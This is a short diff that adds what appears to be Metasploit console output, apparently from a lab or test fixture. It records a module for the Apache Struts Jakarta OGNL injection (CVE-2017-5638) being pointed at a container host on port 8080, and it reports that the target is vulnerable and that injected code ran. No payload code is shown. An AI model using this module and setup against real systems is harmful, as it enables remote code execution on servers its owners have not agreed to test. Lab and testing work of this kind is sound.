@@ -1,0 +1,6 @@
+RHOSTS => struts2-cve
+RPORT => 8080
+[+] 172.26.0.2:8080 - The target is vulnerable. Successfully executed the injected code
+       Name: Apache Struts Jakarta Multipart Parser OGNL Injection
+  This module exploits a remote code execution vulnerability in Apache Struts
+  https://nvd.nist.gov/vuln/detail/CVE-2017-5638
